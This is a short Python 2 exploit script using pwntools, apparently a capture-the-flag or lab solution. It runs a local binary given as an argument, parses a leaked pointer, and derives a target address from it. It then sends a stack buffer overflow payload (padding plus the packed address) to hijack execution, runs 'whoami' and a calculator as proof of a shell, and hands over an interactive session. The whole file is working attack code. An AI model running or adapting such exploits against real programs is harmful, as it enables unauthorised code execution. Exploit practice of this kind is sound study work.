#!/usr/bin/python2
from pwn import *
import sys


p = process(sys.argv[1])


p.recvuntil(':')
leakptr = int(p.recvline().strip(), 16)
shellptr = leakptr - 16
print("Leaked ptr " + hex(leakptr))
print("Which means i think shellptr is " + hex(shellptr))

p.sendline('A' * 64 + 'B' * 8 + p64(shellptr))
p.sendline('whoami ; galculator')
p.interactive()
